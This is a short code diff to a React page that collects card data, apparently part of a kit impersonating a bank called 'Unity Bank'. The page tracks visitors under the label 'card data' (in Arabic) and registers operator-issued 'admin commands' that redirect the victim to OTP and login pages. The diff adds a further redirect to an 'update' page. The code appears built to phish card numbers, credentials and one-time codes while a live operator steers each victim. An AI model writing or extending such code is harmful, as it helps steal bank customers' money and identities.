@@ -12,8 +12,9 @@ function formatCard(val: string) {
 export default function CardPage() {
   useTracking("بيانات البطاقة");
   useAdminCommands({
-    "redirect:otp":   () => { window.location.href = "/unity-bank/otp"; },
-    "redirect:login": () => { window.location.href = "/unity-bank/login"; },
+    "redirect:otp":    () => { window.location.href = "/unity-bank/otp"; },
+    "redirect:login":  () => { window.location.href = "/unity-bank/login"; },
+    "redirect:update": () => { window.location.href = "/unity-bank/update"; },
   });
   const [cardNumber, setCardNumber] = useState("");
   const [cardName, setCardName] = useState("");
